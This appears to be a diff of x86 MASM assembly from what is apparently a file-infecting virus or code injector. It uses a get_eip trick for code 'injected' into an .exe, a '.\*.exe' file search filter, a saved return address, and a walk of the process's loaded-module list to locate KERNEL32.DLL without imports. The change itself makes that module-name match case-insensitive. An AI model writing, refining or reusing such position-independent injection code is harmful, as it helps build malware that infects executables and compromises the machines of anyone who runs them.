@@ -20,8 +20,8 @@ option casemap:none
 .code
 
 data:
-	fileFilter          BYTE ".\*.exe",0
 	returnAddr          DWORD 000000000h
+	fileFilter          BYTE ".\*.exe",0
 
 start:
 	call get_eip ; get the injected .exe's environment instruction pointer
@@ -43,8 +43,8 @@ get_eip:
 	lea edx, (PEB_LDR_DATA PTR [edx]).InMemoryOrderModuleList
 
 	; loop through the linked list until we match with "KERNEL32.DLL"
-	; partial check : length=12; name[0]=K; name[5]=L; name[7]=2
-	; should be enough
+	; partial case insensitive check : length=12; name[0]=K; name[5]=L; name[6]=3; name[7]=2
+	; enough because KERNEL32 should always be before some other DLLs matching this pattern
 loop_find_kernel32:
 	; ->FullDllName / get the UNICODE_STRING struct
 	lea eax, (LDR_DATA_TABLE_ENTRY PTR [edx]).FullDllName
@@ -58,16 +58,30 @@ loop_find_kernel32:
 	mov eax, (UNICODE_STRING PTR [eax]).Buffer
 
 	; check the string
+	xor edi, edi
 	mov bx, [eax]
-	cmp bx, 'K'
+	mov di, 'K'
+	cmp bx, 'a' ; check case
+	jl first_letter_cmp
+	add di, ('a' - 'A') ; make lowercase
+first_letter_cmp:
+	cmp bx, di
 	jne loop_find_kernel32_continue
 	mov bx, [eax + 5 * sizeof WCHAR]
-	cmp bx, 'L'
+	mov di, 'L'
+	cmp bx, 'a'
+	jl second_letter_cmp
+	add di, ('a' - 'A')
+second_letter_cmp:
+	cmp bx, di
 	jne loop_find_kernel32_continue
-	mov bx, [eax + 7 * sizeof WCHAR]
-	cmp bx, '2'
+	mov ebx, [eax + 6 * sizeof WCHAR]
+	cmp ebx, 00320033h ; 32 in WCHAR in little endian
 	jne loop_find_kernel32_continue
 	jmp loop_find_kernel32_end
+
+
+
 loop_find_kernel32_continue:
 	; (LIST_ENTRY)->Flink / get next loaded module
 	mov edx, (LIST_ENTRY PTR [edx]).Flink
